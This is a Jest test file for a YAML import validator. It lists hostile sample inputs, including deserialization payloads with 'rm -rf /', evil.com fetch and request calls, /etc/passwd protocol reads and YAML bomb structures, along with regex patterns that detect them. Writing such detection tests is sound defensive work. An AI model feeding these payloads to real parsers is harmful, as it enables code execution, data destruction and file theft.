import { describe, test, expect } from '@jest/globals';

describe('YAML Security Pattern Expansion Tests', () => {
  describe('Language-specific deserialization attacks', () => {
    test('should detect expanded language-specific deserialization attacks', () => {
      const expandedExploits = [
        // Ruby deserialization
        { yaml: `exploit: !!ruby/object:Kernel`, pattern: '!!ruby/', desc: 'Ruby object injection' },
        { yaml: `rce: !!ruby/hash { }`, pattern: '!!ruby/', desc: 'Ruby hash injection' },
        { yaml: `backdoor: !!ruby/struct:OpenStruct`, pattern: '!!ruby/', desc: 'Ruby struct injection' },
        { yaml: `marshal: !!ruby/marshal { }`, pattern: '!!ruby/', desc: 'Ruby marshal injection' },
        
        // Java deserialization
        { yaml: `exploit: !!java/object:java.lang.Runtime`, pattern: '!!java', desc: 'Java object injection' },
        { yaml: `rce: !!javax/script/ScriptEngineManager`, pattern: '!!javax', desc: 'Java script engine injection' },
        { yaml: `backdoor: !!com.sun.rowset.JdbcRowSetImpl`, pattern: '!!com.sun', desc: 'Java rowset injection' },
        
        // Perl deserialization
        { yaml: `exploit: !!perl/hash { }`, pattern: '!!perl/', desc: 'Perl hash injection' },
        { yaml: `rce: !!perl/code sub { system("rm -rf /") }`, pattern: '!!perl/', desc: 'Perl code injection' },
        
        // PHP deserialization
        { yaml: `exploit: !!php/object "O:8:\\"stdClass\\":0:{}"`, pattern: '!!php/', desc: 'PHP object injection' },
        
        // Constructor and function injection
        { yaml: `exploit: !!call [system, "rm -rf /"]`, pattern: '!!call', desc: 'Function call injection' },
        { yaml: `rce: !!invoke { target: eval, args: ["evil_code()"] }`, pattern: '!!invoke', desc: 'Method invoke injection' },
        
        // YAML-specific dangerous features
        { yaml: `exploit: !!binary "base64encodedpayload"`, pattern: '!!binary', desc: 'Binary data injection' },
        { yaml: `merge: !!merge { << : *evil }`, pattern: '!!merge', desc: 'Merge key injection' }
      ];
      
      for (const { yaml: yamlContent, pattern, desc } of expandedExploits) {
        expect(() => {
          if (yamlContent.includes(pattern)) {
            throw new Error(`Dangerous YAML pattern detected: ${desc}`);
          }
        }).toThrow(/Dangerous YAML pattern detected/);
      }
    });
  });

  describe('Enhanced YAML bomb patterns', () => {
    test('should detect enhanced YAML bomb patterns', () => {
      const enhancedBombs = [
        // Merge key bombs
        {
          yaml: `
base: &base { a: 1, b: 2, c: 3, d: 4, e: 5 }
level1: { <<: *base, <<: *base, <<: *base, <<: *base, <<: *base, <<: *base }
level2: { <<: *base, <<: *base, <<: *base, <<: *base, <<: *base, <<: *base }
level3: { <<: *base, <<: *base, <<: *base, <<: *base, <<: *base, <<: *base }
`,
          desc: 'merge key bomb'
        },
        
        // Multiple document bombs
        {
          yaml: `---
doc1: &ref [data, data, data]
---
doc2: *ref
---
doc3: *ref
---
doc4: *ref
---
doc5: *ref
`,
          desc: 'multi-document bomb'
        },
        
        // Nested tag with anchor combination
        {
          yaml: `exploit: &evil !!python/object/apply:os.system ["rm -rf /"]`,
          desc: 'nested tag with anchor'
        }
      ];
      
      for (const { yaml: yamlContent, desc } of enhancedBombs) {
        expect(() => {
          const anchorCount = (yamlContent.match(/&\w+/g) || []).length;
          const aliasCount = (yamlContent.match(/\*\w+/g) || []).length;
          const mergeKeyCount = (yamlContent.match(/<<:/g) || []).length;
          const documentCount = (yamlContent.match(/^---/gm) || []).length;
          const nestedTagPattern = /[&*]\w+\s*!!/;
          
          if (anchorCount > 10 || aliasCount > 20 || mergeKeyCount > 5 || documentCount > 3) {
            throw new Error(`Enhanced YAML bomb detected: ${desc}`);
          }
          
          if (nestedTagPattern.test(yamlContent)) {
            throw new Error(`Dangerous nested YAML tag combination: ${desc}`);
          }
        }).toThrow(/Enhanced YAML bomb detected|Dangerous nested YAML tag combination/);
      }
    });
  });

  describe('Protocol handler and network attacks', () => {
    test('should detect dangerous protocol handlers in YAML content', () => {
      const protocolAttacks = [
        { yaml: `url: "file:///etc/passwd"`, pattern: 'file://', desc: 'file protocol handler' },
        { yaml: `data: "data://text/plain;base64,SGVsbG8="`, pattern: 'data://', desc: 'data protocol handler' },
        { yaml: `resource: "expect://command"`, pattern: 'expect://', desc: 'expect protocol handler' },
        { yaml: `script: "php://filter/read=convert.base64-encode/resource=index.php"`, pattern: 'php://', desc: 'PHP protocol handler' },
        { yaml: `archive: "phar://malicious.phar/file.txt"`, pattern: 'phar://', desc: 'PHAR protocol handler' },
        { yaml: `compressed: "zip://archive.zip#file.txt"`, pattern: 'zip://', desc: 'ZIP protocol handler' },
        { yaml: `remote: "ssh2://user:pass@host/path"`, pattern: 'ssh2://', desc: 'SSH2 protocol handler' },
        { yaml: `media: "ogg://stream.example.com/audio"`, pattern: 'ogg://', desc: 'OGG protocol handler' }
      ];
      
      for (const { yaml: yamlContent, pattern, desc } of protocolAttacks) {
        expect(() => {
          if (yamlContent.includes(pattern)) {
            throw new Error(`Dangerous protocol handler detected: ${desc}`);
          }
        }).toThrow(/Dangerous protocol handler detected/);
      }
    });

    test('should detect network operation patterns', () => {
      const networkPatterns = [
        { yaml: `request: "socket.connect('evil.com', 80)"`, pattern: 'socket.connect', desc: 'socket operation' },
        { yaml: `fetch_data: "urllib.request.urlopen('http://evil.com')"`, pattern: 'urllib.request', desc: 'urllib operation' },
        { yaml: `api_call: "requests.get('http://evil.com/api')"`, pattern: 'requests.get', desc: 'requests operation' },
        { yaml: `download: "fetch('http://evil.com/payload')"`, pattern: "fetch('http://", desc: 'fetch operation' },
        { yaml: `xhr: "new XMLHttpRequest()"`, pattern: 'new XMLHttpRequest', desc: 'XMLHttpRequest operation' },
        { yaml: `get_request: ".get('http://evil.com')"`, pattern: ".get('http://", desc: 'HTTP GET operation' },
        { yaml: `post_request: ".post('http://evil.com', data)"`, pattern: ".post('http://", desc: 'HTTP POST operation' }
      ];
      
      for (const { yaml: yamlContent, pattern, desc } of networkPatterns) {
        expect(() => {
          if (yamlContent.includes(pattern)) {
            throw new Error(`Network operation detected: ${desc}`);
          }
        }).toThrow(/Network operation detected/);
      }
    });
  });

  describe('Unicode and encoding bypass attempts', () => {
    test('should detect Unicode direction override attacks', () => {
      const unicodeAttacks = [
        // Direction override characters
        { yaml: `name: "admin\u202Euser"`, desc: 'right-to-left override' },
        { yaml: `file: "safe.txt\u202Dmalicious.exe"`, desc: 'left-to-right override' },
        { yaml: `path: "/safe\u2066/hidden\u2069/file.txt"`, desc: 'directional isolate' },
        
        // Zero-width characters
        { yaml: `cmd: "echo\u200B evil"`, desc: 'zero-width space' },
        { yaml: `script: "rm\u2028 -rf /"`, desc: 'line separator' },
        { yaml: `code: "eval\u202F('evil')"`, desc: 'narrow no-break space' },
        
        // Special markers
        { yaml: `payload: "\uFEFFhidden_command"`, desc: 'BOM character' },
        { yaml: `exploit: "cmd\uFFFE"`, desc: 'non-character' },
        
        // Unicode escape sequences
        { yaml: `quote: "\\u0022evil\\u0022"`, desc: 'Unicode quote escape' },
        { yaml: `apostrophe: "\\u0027cmd\\u0027"`, desc: 'Unicode apostrophe escape' },
        { yaml: `bracket: "\\u003Cscript\\u003E"`, desc: 'Unicode bracket escape' },
        { yaml: `entity: "\\u003cscript"`, desc: 'Unicode entity escape' }
      ];
      
      for (const { yaml: yamlContent, desc } of unicodeAttacks) {
        expect(() => {
          // Check for direction override characters
          if (/[\u202A-\u202E\u2066-\u2069]/.test(yamlContent)) {
            throw new Error(`Direction override attack detected: ${desc}`);
          }
          
          // Check for zero-width and special spaces
          if (/[\u200B-\u200F\u2028-\u202F]/.test(yamlContent)) {
            throw new Error(`Zero-width character attack detected: ${desc}`);
          }
          
          // Check for special markers
          if (/[\uFEFF\uFFFE\uFFFF]/.test(yamlContent)) {
            throw new Error(`Special marker attack detected: ${desc}`);
          }
          
          // Check for Unicode escape sequences
          if (/\\[uU]0*(?:22|27|60|3[cC])/.test(yamlContent)) {
            throw new Error(`Unicode escape attack detected: ${desc}`);
          }
        }).toThrow(/attack detected/);
      }
    });

    test('should NOT flag legitimate content that was previously causing false positives', () => {
      const legitimateYaml = [
        'name: "Test Import Persona"',
        'description: "Test description for import"',
        'version: "1.0"',
        'author: "test-author"',
        'category: "test"',
        'unique_id: "test-import_20250711-120000_test-author"',
        'created_date: "2025-07-11T12:00:00.000Z"',
        'content: "You are a helpful test assistant."',
        'filename: "test-import.md"',
        'exportedAt: "2025-07-11T12:00:00.000Z"',
        'exportedBy: "test-user"',
        'instructions: "Please import this persona and help users with their questions."',
        'usage: "Use .get() method to retrieve data safely"',
        'notes: "This requires careful handling of open() calls"',
        'docs: "See readFile documentation for examples"'
      ];
      
      for (const yamlLine of legitimateYaml) {
        // These should NOT trigger any security patterns
        expect(() => {
          // Apply the same pattern checks as our validator
          // If any pattern matches, this would indicate a false positive
          
          // All these should be safe and not match any dangerous patterns
          const checks = [
            /subprocess\./,
            /os\.system/,
            /eval\s*\(/,
            /exec\s*\(/,
            /__import__\s*\(/,
            /require\s*\(/,
            /import\s+(?:os|sys|subprocess|eval|exec)/,
            /socket\.connect/,
            /urllib\.request/,
            /requests\.(?:get|post|put|delete)\s*\(/,
            /fetch\s*\(\s*["']https?:\/\//,
            /new\s+XMLHttpRequest/,
            /\.(?:get|post|put|delete)\s*\(\s*["']https?:\/\//,
            /(?:fs\.|file\.|)\s*open\s*\(\s*["'](?:\/etc\/|\/bin\/|\.\.\/)/
          ];
          
          for (const pattern of checks) {
            if (pattern.test(yamlLine)) {
              throw new Error(`False positive: ${pattern} matched legitimate content: ${yamlLine}`);
            }
          }
        }).not.toThrow();
      }
    });
  });
});